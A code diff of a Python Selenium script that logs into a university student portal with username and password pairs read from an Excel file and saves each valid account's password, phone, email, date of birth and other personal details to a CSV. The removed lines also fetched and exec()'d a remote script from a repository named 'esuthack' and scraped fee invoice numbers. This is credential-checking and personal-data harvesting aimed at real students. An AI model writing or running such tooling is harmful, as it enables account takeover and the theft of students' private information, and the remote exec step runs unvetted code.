@@ -6,7 +6,6 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
-import requests
 
 def login_and_get_profile_info(username, password, chromedriver_path):
     # Set the path to the chromedriver
@@ -67,33 +66,7 @@ def login_and_get_profile_info(username, password, chromedriver_path):
             email = email_element.get_attribute('value')
             date_of_birth = date_of_birth_element.get_attribute('value')
 
-            driver.get('https://portal.esut.edu.ng/modules/schoolfees/getinvoice.aspx?idx=SCHF')
-
-            try:
-                WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.CLASS_NAME, "swal-button--confirm"))
-                ).click()
-            except TimeoutException:
-                print("Popup not found or already closed.")
-
-            session_dropdown = WebDriverWait(driver, 10).until(
-                EC.presence_of_element_located((By.ID, 'ddlSession'))
-            )
-            session_dropdown.click()
-            session_dropdown.find_element(By.XPATH, "//option[@value='26']").click()
-
-            generate_button = driver.find_element(By.ID, 'Button1')
-            generate_button.click()
-
-            try:
-                invoice_element = WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.ID, 'lblRefNo'))
-                )
-                invoice_number = invoice_element.text
-            except TimeoutException:
-                print(f"Invoice number not found for {username}. Skipping...")
-                return None
-
+            # Return the extracted data
             return {
                 'Username': username,
                 'Password': password,
@@ -104,8 +77,7 @@ def login_and_get_profile_info(username, password, chromedriver_path):
                 'MatricNumber': matric_number,
                 'Department': department,
                 'Email': email,
-                'DateOfBirth': date_of_birth,
-                'InvoiceNumber': invoice_number
+                'DateOfBirth': date_of_birth
             }
         else:
             print(f"Login failed for {username}. Skipping...")
@@ -113,18 +85,20 @@ def login_and_get_profile_info(username, password, chromedriver_path):
     finally:
         driver.quit()
 
-def check_credentials(input_file, output_file, chromedriver_path):
+def process_accounts(input_file, output_file, chromedriver_path):
+    # Read accounts data from Excel
     accounts_df = pd.read_excel(input_file)
-    valid_accounts_df = pd.DataFrame(columns=[
-        'Username', 'Password', 'Surname', 'Firstname', 'Middlename', 'Phone', 'MatricNumber', 
-        'Department', 'Email', 'DateOfBirth', 'InvoiceNumber'])
 
-    # Open the output file in append mode ('a')
-    with open(output_file, 'a', newline='') as csvfile:
-        # Write header only if the file is empty
-        if csvfile.tell() == 0:
-            valid_accounts_df.to_csv(csvfile, index=False)  # Write header if file is empty
+    # Open the CSV file for writing (overwrite mode)
+    with open(output_file, 'w', newline='') as csvfile:
+        # Initialize CSV writer
+        header = ['Username', 'Password', 'Surname', 'Firstname', 'Middlename', 'Phone', 'MatricNumber', 
+                  'Department', 'Email', 'DateOfBirth']
+        
+        writer = pd.DataFrame(columns=header)
+        writer.to_csv(csvfile, header=True, index=False)
 
+        # Process each account and save the profile immediately after processing
         for index, row in accounts_df.iterrows():
             username = row['username']
             password = row['password']
@@ -132,32 +106,17 @@ def check_credentials(input_file, output_file, chromedriver_path):
             profile_info = login_and_get_profile_info(username, password, chromedriver_path)
 
             if profile_info is not None:
+                # Write the valid profile info to the CSV file
                 profile_info_df = pd.DataFrame([profile_info])
                 profile_info_df.to_csv(csvfile, header=False, index=False)  # Append data
-                csvfile.flush()  # Flush after each write to force it to disk immediately
+                csvfile.flush()  # Force the data to be written immediately
                 print(f"Saved profile info for {username}")
 
     print(f"Results saved to {output_file}")
 
-def fetch_and_run_github_script():
-    input_file = "/path/to/input_file.xlsx"
-    output_file = "/path/to/output_file.csv"
-    chromedriver_path = "/opt/homebrew/bin/chromedriver"
-    
-    github_raw_url = "https://raw.githubusercontent.com/CyberPlugNG/esuthack/main/esuthackscript.py"
-    response = requests.get(github_raw_url)
-
-    if response.status_code == 200:
-        script_content = response.text
-        exec_globals = {
-            "__name__": "__main__",
-            "input_file": input_file,
-            "output_file": output_file,
-            "chromedriver_path": chromedriver_path,
-        }
-        exec(script_content, exec_globals)
-    else:
-        print(f"Failed to fetch the script: {response.status_code} - {response.reason}")
-
 if __name__ == "__main__":
-    fetch_and_run_github_script()
+    input_file = "/path/to/your/input.xlsx"  # Input Excel file with usernames and passwords
+    output_file = "/path/to/output.csv"  # Output CSV file to save the profiles
+    chromedriver_path = "/path/to/chromedriver"  # Path to the ChromeDriver binary
+
+    process_accounts(input_file, output_file, chromedriver_path)
